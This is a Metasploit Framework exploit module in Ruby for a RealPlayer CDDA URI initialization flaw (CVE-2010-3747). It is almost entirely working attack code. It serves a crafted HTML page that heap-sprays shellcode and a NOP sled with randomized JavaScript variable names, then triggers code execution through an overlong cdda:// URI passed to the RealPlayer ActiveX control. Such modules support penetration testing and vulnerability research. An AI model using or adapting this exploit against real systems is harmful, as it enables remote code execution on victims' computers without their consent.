# $Id: realplayer_cdda_uri.rb 12009 2011-03-17 15:42:28Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;RealNetworks RealPlayer CDDA URI Initialization Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a initialization flaw within RealPlayer 11/11.1 and
                RealPlayer SP 1.0 - 1.1.4. An abnormally long CDDA URI causes an object
                initialization failure. However, this failure is improperly handled and
                uninitialized memory executed.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;bannedit&#039;,
                    &#039;sinn3r&#039;
                ],
            &#039;Version&#039;        => &#039;$Revision: 12009 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-3747&#039; ],
                    [ &#039;OSVDB&#039;, &#039;68673&#039;],
                    [ &#039;BID&#039;, &#039;44144&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-210/&#039;],
                    [ &#039;URL&#039;, &#039;http://service.real.com/realplayer/security/10152010_player/en/&#039;]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;RealPlayer SP 1.0 - 1.1.4 Universal&#039;,     { &#039;Ret&#039; => 0x21212121 } ],
                    [ &#039;RealPlayer 11.0 - 11.1 Universal&#039;,        { &#039;Ret&#039; => 0x21212121 } ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Nov 15 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def on_request_uri(cli, request)
        # Re-generate the payload
        return if ((p = regenerate_payload(cli)) == nil)
 
        mytarget = target
 
        # the ret slide gets executed via call [esi+45b]
        retslide = [mytarget.ret].pack(&#039;V&#039;) * 750
        cdda_uri = "cdda://" +  retslide
 
        # Encode the shellcode
        shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
        nops = make_nops(8)
        nop_sled = Rex::Text.to_unescape(nops, Rex::Arch.endian(target.arch))
 
        # Randomize Javascript variables
        var_blocks    = rand_text_alpha(rand(6)+3)
        var_shellcode = rand_text_alpha(rand(6)+3)
        var_index     = rand_text_alpha(rand(6)+3)
        var_nopsled   = rand_text_alpha(rand(6)+3)
        spray_func    = rand_text_alpha(rand(6)+3)
        obj_id        = rand_text_alpha(rand(6)+3)
        html = <<-EOS
<html>
<head>
<script>
function #{spray_func}() {
    #{var_blocks} = new Array();
    var #{var_shellcode} = unescape("#{shellcode}");
    var #{var_nopsled} = unescape("#{nop_sled}");
    do { #{var_nopsled} += #{var_nopsled} } while (#{var_nopsled}.length < 8200);
        for (#{var_index}=0; #{var_index} < 19000; #{var_index}++)
            #{var_blocks}[#{var_index}] = #{var_nopsled} + #{var_shellcode};
    }
#{spray_func}();
</script>
</head>
<object id=#{obj_id} classid=&#039;clsid:CFCDAA03-8BE4-11CF-B84B-0020AFBBCCFA&#039; width=0 height=0>
<param name="CONTROLS" value="ControlPanel">
<param name="src" value="#{cdda_uri}">
</object>
<script language="VBScript">
#{obj_id}.DoPlay
</script>
</html>
EOS
        print_status("Sending #{self.name} HTML to #{cli.peerhost}:#{cli.peerport}")
        send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
    end
end



